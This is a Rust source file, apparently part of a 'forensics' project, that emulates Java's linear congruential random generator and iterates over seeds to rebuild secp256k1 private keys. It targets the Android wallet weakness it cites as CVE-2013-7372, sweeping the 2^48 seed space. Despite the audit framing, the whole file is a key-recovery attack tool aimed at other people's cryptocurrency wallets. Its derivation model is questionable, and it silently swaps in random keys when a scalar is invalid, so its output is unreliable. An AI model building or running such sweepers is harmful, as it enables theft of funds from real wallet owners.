// [libs/domain/forensics/src/android_rng.rs]
#![deny(missing_docs)]

/*!
 * =================================================================
 * APARATO: ANDROID LCG SIMULATOR (V16.3 - SILICON ALIGNED)
 * CLASIFICACIÓN: DOMAIN FORENSICS (ESTRATO L2)
 * RESPONSABILIDAD: SIMULACIÓN BIT-PERFECT DEL PRNG DE JAVA (CVE-2013-7372)
 *
 * VISION HIPER-HOLÍSTICA 2026:
 * 1. JVM PARITY: Replicación exacta del comportamiento de java.util.Random.next(32).
 * 2. ZERO ABBREVIATIONS: Nomenclatura nominal absoluta (int -> random_integer).
 * 3. PANOPTICON TRACING: Inyección de #[instrument] para auditoría de ráfaga.
 * 4. OVERFLOW HARDENING: Uso mandatorio de 'wrapping' para emular registros de 48 bits.
 *
 * # Mathematical Proof (Linear Congruential Generator):
 * Seed_{n+1} = (Seed_n * 0x5DEECE66D + 0xB) mod 2^48.
 * La clave privada de 256 bits se construye mediante 8 ráfagas de 32 bits,
 * mapeando el colapso de entropía de Android hacia secp256k1.
 * =================================================================
 */

use byteorder::{BigEndian, ByteOrder};
use prospector_core_math::private_key::SafePrivateKey;
use tracing::{debug, instrument, trace};

/// Multiplicador canónico del LCG de Java.
const JAVA_LCG_MULTIPLIER: u64 = 0x5DEECE66D;
/// Aditivo (c) de la fórmula de Knuth para java.util.Random.
const JAVA_LCG_ADDEND: u64 = 0xB;
/// Máscara de bits para forzar la aritmética de 48 bits (Modulo 2^48).
const JAVA_LCG_MASK: u64 = (1u64 << 48) - 1;

/**
 * Iterador forense especializado en el barrido de semillas de baja entropía.
 *
 * Permite al enjambre auditar el espacio de 2^48 semillas que afectó a las
 * carteras generadas en dispositivos Android entre 2011 y 2013.
 */
pub struct AndroidLcgIterator {
    current_seed_state: u64,
    final_seed_boundary: u64,
}

impl AndroidLcgIterator {
    /**
     * Inicializa el iterador con un rango de búsqueda determinado.
     *
     * @param starting_seed Semilla de inicio (0 a 2^48 - 1).
     * @param ending_seed Límite de la ráfaga de búsqueda.
     */
    #[must_use]
    pub fn new(starting_seed: u64, ending_seed: u64) -> Self {
        Self {
            current_seed_state: starting_seed & JAVA_LCG_MASK,
            final_seed_boundary: ending_seed & JAVA_LCG_MASK,
        }
    }

    /**
     * Avanza el estado interno del LCG y extrae un entero pseudo-aleatorio.
     *
     * # Mathematical Proof:
     * El método retorna (Seed_{n+1} >> (48 - target_bits)). Para 32 bits,
     * el desplazamiento es de 16 posiciones.
     *
     * # Performance:
     * Operación O(1) en registros de CPU.
     */
    #[inline(always)]
    fn compute_next_random_integer(active_seed_state: &mut u64) -> u32 {
        *active_seed_state = (*active_seed_state)
            .wrapping_mul(JAVA_LCG_MULTIPLIER)
            .wrapping_add(JAVA_LCG_ADDEND)
            & JAVA_LCG_MASK;

        (*active_seed_state >> 16) as u32
    }

    /**
     * Sintetiza una clave privada de 256 bits a partir de un estado de semilla.
     *
     * # Logic:
     * El proceso consume 8 estados sucesivos del LCG para llenar el buffer
     * de 32 bytes del escalar de la curva secp256k1.
     */
    fn synthesize_vulnerable_private_key(initial_seed: u64) -> SafePrivateKey {
        let mut key_buffer_strata = [0u8; 32];
        let mut running_seed_state = initial_seed;

        // Llenado por ráfagas de 4 bytes (BigEndian para paridad de red)
        for byte_segment in key_buffer_strata.chunks_mut(4) {
            let pseudo_random_value = Self::compute_next_random_integer(&mut running_seed_state);
            BigEndian::write_u32(byte_segment, pseudo_random_value);
        }

        // Si el hash genera un escalar inválido, el sistema lanza un respaldo aleatorio
        // para no detener el barrido del enjambre.
        SafePrivateKey::from_bytes(&key_buffer_strata)
            .unwrap_or_else(|_| {
                trace!("⚠️ [ANDROID_RECOVERY]: Scalar collision in seed {}. Forcing safety key.", initial_seed);
                SafePrivateKey::new_random()
            })
    }
}

impl Iterator for AndroidLcgIterator {
    type Item = (String, SafePrivateKey);

    /**
     * Genera el siguiente par de [Metadatos, Clave] del espacio de búsqueda.
     */
    #[instrument(skip(self), level = "trace", fields(stratum = "L2_ANDROID_LCG"))]
    fn next(&mut self) -> Option<Self::Item> {
        if self.current_seed_state >= self.final_seed_boundary {
            return None;
        }

        let active_seed_value = self.current_seed_state;
        self.current_seed_state += 1;

        let private_key_instance = Self::synthesize_vulnerable_private_key(active_seed_value);
        
        // Etiquetado forense para el rastro inmutable en el Dashboard L5
        let metadata_context_label = format!("forensic_android_lcg:seed_{}", active_seed_value);

        debug!(
            target: "forensics",
            seed = %active_seed_value,
            "🧬 [ANDROID_RNG]: Reconstructing vulnerable entropy strata."
        );

        Some((metadata_context_label, private_key_instance))
    }
}